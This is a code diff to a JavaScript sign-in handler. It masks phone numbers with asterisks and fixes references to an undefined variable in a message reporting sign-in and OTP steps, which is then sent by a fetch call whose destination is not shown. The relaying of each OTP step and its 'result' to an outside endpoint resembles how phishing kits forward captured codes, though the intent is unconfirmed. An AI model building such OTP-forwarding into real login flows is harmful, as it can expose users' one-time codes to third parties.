@@ -20,17 +20,17 @@ export default async function handler(req, res) {
     const safePhone = phone
       ? String(phone).replace(
           /^(\+?\d{2})\d+(\d{2})$/,
-          "$111111$2"
+          "$1******$2"
         )
-      : "provided";
+      : "Not provided";
 
     const message =
       `🔐 Sign In attempt\n\n` +
-      `📱 Phone: ${Phone}\n\n` +
+      `📱 Phone: ${safePhone}\n\n` +
       `🔒 OTP requested\n` +
-      `📱 Phone: ${Phone}\n\n` +
+      `📱 Phone: ${safePhone}\n\n` +
       `🔑 OTP\n` +
-      `📱 Phone: ${Phone}\n\n` +
+      `📱 Phone: ${safePhone}\n\n` +
       `✅ Result: ${result || "OTP entered"}`;
 
     const response = await fetch(
